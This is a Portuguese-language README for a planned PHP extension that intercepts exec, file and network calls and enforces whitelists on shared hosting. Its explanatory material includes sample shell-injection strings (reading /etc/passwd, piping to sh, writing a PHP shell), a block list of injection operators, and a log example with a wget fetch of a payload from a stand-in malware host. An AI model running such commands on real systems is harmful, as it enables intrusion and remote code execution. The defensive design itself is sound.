# PHP Security Guard

> Native PHP security extension for shared hosting environments, designed to intercept sensitive PHP function calls and enforce whitelist-based policies for commands, files, URLs, domains, and explicit IP addresses.

---



### Visão geral

**PHP Security Guard** é uma extensão nativa para PHP, compilada como módulo `.so`, criada para adicionar uma camada extra de segurança em ambientes de hospedagem PHP-FPM, especialmente servidores com **CWP**, **cPanel** e painéis Linux similares.

A extensão usa hook em `zend_execute_ex` para interceptar chamadas a funções PHP sensíveis e aplicar políticas de segurança baseadas em whitelists administradas pelo servidor.

O projeto foi pensado para ser transparente para os sites hospedados: as aplicações PHP existentes não precisam ser alteradas. Operações autorizadas continuam funcionando normalmente, enquanto operações não autorizadas podem ser monitoradas, registradas em log ou bloqueadas, conforme o modo de operação configurado.

---

### Objetivo principal

O objetivo principal é reduzir a superfície de ataque em ambientes de hospedagem PHP compartilhada, controlando funções perigosas ou sensíveis como:

```php
exec()
passthru()
shell_exec()
system()
proc_open()
popen()
curl_exec()
curl_multi_exec()
parse_ini_file()
show_source()
file_get_contents()
fopen()
readfile()
```

Em vez de simplesmente desabilitar todas as funções globalmente, o PHP Security Guard propõe um modelo granular baseado em listas explícitas de permissão.

---

### Modelo de segurança

A extensão divide as operações monitoradas em três grandes grupos:

```text
1. Execução de comandos
2. Acesso local a arquivos
3. Acesso externo por URLs, domínios, IPs explícitos e CIDRs
```

Cada grupo possui seu próprio arquivo de whitelist:

```text
/etc/security_guard/allowed_commands.conf
/etc/security_guard/allowed_files.conf
/etc/security_guard/allowed_network.conf
```

A filosofia padrão é:

```text
Negar por padrão.
Permitir somente o que estiver explicitamente autorizado.
Registrar operações negadas.
Opcionalmente registrar operações autorizadas.
```

---

### O que a extensão controla

#### Execução de comandos

Controla chamadas para funções como:

```php
exec()
shell_exec()
system()
passthru()
proc_open()
popen()
```

Somente binários explicitamente autorizados devem ser permitidos.

Exemplo:

```text
command|/usr/bin/optipng|2026-05-04T14:30:00-03:00|admin|Otimização de PNG
command|/usr/bin/jpegtran|2026-05-04T14:31:00-03:00|admin|Otimização de JPEG
command|/usr/bin/gifsicle|2026-05-04T14:32:00-03:00|admin|Otimização de GIF
```

**Proteção contra Command Injection (Aninhamento):**
Mesmo que um binário seja permitido na whitelist (ex: `/usr/bin/optipng`), a extensão faz uma varredura rigorosa em toda a string de comando antes de liberar a execução. Ela bloqueia instantaneamente qualquer tentativa de injeção de shell usando os seguintes operadores:
```text
;  &&  ||  |  >>  >  <  `  $(  ${  \n  \r
```
Isso torna impossível técnicas de RCE como:
- `optipng file.png ; cat /etc/passwd`
- `optipng file.png | sh`
- `optipng file.png > /var/www/html/shell.php`
- `optipng $(whoami)`

**Proteção contra Download + Execução:**
Se um atacante usar o PHP para baixar um script malicioso (ex: via `file_get_contents` ou `curl`) e salvá-lo no disco, ele não conseguirá executá-lo via comando (ex: `exec('/bin/bash payload.sh')`) a menos que `/bin/bash` esteja na whitelist. A extensão intercepta a chamada, extrai o binário principal e recusa a execução de binários não autorizados. Caso um binário válido seja utilizado, a extensão registra rigorosamente o binário e os argumentos no log JSONL.

---

#### Acesso local a arquivos

Controla operações sensíveis de leitura de arquivos, como:

```php
parse_ini_file()
show_source()
highlight_file()
file_get_contents()
fopen()
readfile()
```

Somente caminhos absolutos explicitamente autorizados devem ser permitidos.

Exemplo:

```text
file|/home/example/public_html/wp-content/uploads|2026-05-04T14:40:00-03:00|admin|Uploads do WordPress
file|/etc/ssl/certs/ca-bundle.crt|2026-05-04T14:42:00-03:00|admin|Bundle CA
```

---

#### Acesso externo por rede

Controla chamadas de rede realizadas por funções como:

```php
curl_exec()
curl_multi_exec()
file_get_contents()
fopen()
fsockopen()
pfsockopen()
stream_socket_client()
```

Entradas de rede permitidas podem incluir:

```text
domain
url
ip
cidr
```

Exemplo:

```text
domain|api.mercadopago.com|2026-05-04T15:00:00-03:00|admin|Gateway de pagamento
domain|example.com|2026-05-04T15:01:00-03:00|admin|Domínio base
domain|*.example.com|2026-05-04T15:02:00-03:00|admin|Subdomínios permitidos
url|https://api.example.com/v1/payments|2026-05-04T15:03:00-03:00|admin|Endpoint específico
ip|127.0.0.1|2026-05-04T15:04:00-03:00|admin|Serviço local explícito
cidr|192.168.0.0/24|2026-05-04T15:05:00-03:00|admin|Range interno explícito
```

Importante: esta extensão **não resolve DNS**. A validação de domínio é aplicada ao host textual informado na URL. Regras de IP são aplicadas somente quando a URL ou conexão usa IP explícito, por exemplo:

```text
https://127.0.0.1/
http://192.168.0.10/api
```

---

### Subdomínios com wildcard

Subdomínios com wildcard são suportados com regras de validação.

Válido:

```text
domain|example.com|2026-05-04T15:01:00-03:00|admin|Domínio base
domain|*.example.com|2026-05-04T15:02:00-03:00|admin|Subdomínios
```

Inválido:

```text
domain|*.example.com|2026-05-04T15:02:00-03:00|admin|Subdomínios
```

Uma entrada wildcard não deve existir sem o domínio base correspondente.

---

### Configuração no php.ini

Exemplo de configuração:

```ini
extension=security_guard.so

security_guard.enabled=1
; Modos: off, monitor, block
security_guard.enforcement_mode=monitor

security_guard.allowed_commands_file=/etc/security_guard/allowed_commands.conf
security_guard.allowed_files_file=/etc/security_guard/allowed_files.conf
security_guard.allowed_network_file=/etc/security_guard/allowed_network.conf

security_guard.log_allowed=0
security_guard.log_denied=1
security_guard.log_scope=per_user
security_guard.log_path=/var/log/security_guard

security_guard.allow_wildcard_domains=1
security_guard.require_base_domain_for_wildcard=1
security_guard.block_private_networks=1
security_guard.explicit_allow_overrides_private_block=1
security_guard.block_metadata_endpoints=1
security_guard.emit_php_warning=1
security_guard.config_reload_interval=60
security_guard.log_format=jsonl
```

---

### Modos de operação

```text
off      Extensão carregada, mas sem monitorar ou bloquear
monitor  Detecta e registra violações sem bloquear
block    Bloqueia chamadas não autorizadas
```

Implantação recomendada:

```text
1. Iniciar em modo monitor.
2. Revisar logs de negação.
3. Construir whitelists.
4. Ativar modo block após validação.
```

---

### Logs

O PHP Security Guard suporta logs estruturados em JSONL.

Exemplo de log de comando bloqueado:

```json
{"ts":"2026-05-04T15:32:00-03:00","action":"deny","group":"command","function":"shell_exec","user":"client1","uid":1005,"script":"/home/client1/public_html/wp-content/plugins/x/a.php","target":"wget http://malware.example/payload.sh","reason":"command_not_whitelisted","mode":"block"}
```

Exemplo de log de rede bloqueada:

```json
{"ts":"2026-05-04T15:31:00-03:00","action":"deny","group":"network","function":"file_get_contents","user":"client1","uid":1005,"script":"/home/client1/public_html/test.php","target":"http://127.0.0.1:8080/admin","scheme":"http","host":"127.0.0.1","port":8080,"host_type":"ip","reason":"ip_not_whitelisted","mode":"block"}
```

Os logs podem ser globais ou separados por usuário Linux/PHP-FPM.

---

### Plugin para CWP

O projeto também inclui a especificação de um **plugin administrativo para CWP** para gerenciar as whitelists.

O plugin deve permitir que administradores:

```text
- Adicionem, removam e listem comandos permitidos
- Adicionem, removam e listem arquivos/diretórios permitidos
- Adicionem, removam e listem domínios, URLs, IPs e CIDRs permitidos
- Validem subdomínios com wildcard
- Evitem registros duplicados
- Visualizem logs globais e por usuário
- Alternem entre os modos off, monitor e block
- Auditem alterações administrativas
```

O plugin deve verificar registros duplicados e manter apenas uma entrada por arquivo de configuração.

---

### Status do projeto

Este projeto está atualmente em fase de especificação/design.

Roadmap planejado:

```text
0.1 - Hook zend_execute_ex, política de comandos e logs JSONL
0.2 - Política de acesso a arquivos
0.3 - Política de rede sem DNS lookup
0.4 - Plugin CWP inicial
0.5 - Hardening adicional e testes com CMSs
1.0 - Release estável, documentação, pacotes e publicação para a comunidade
```

---

### Aviso de segurança

PHP Security Guard é uma camada adicional de hardening. Ele não substitui:

```text
Isolamento por usuário Linux
Pools PHP-FPM separados por usuário
Permissões corretas de arquivos
open_basedir
Firewall de saída
ModSecurity/WAF
Scanner de malware
Backups
Atualização de CMSs/plugins
```

A extensão valida o que o código PHP tenta executar ou acessar. Ela deve ser usada em conjunto com controles de segurança do sistema operacional e do painel de hospedagem.

---

### Licença

Licença recomendada:

```text
Apache-2.0
```
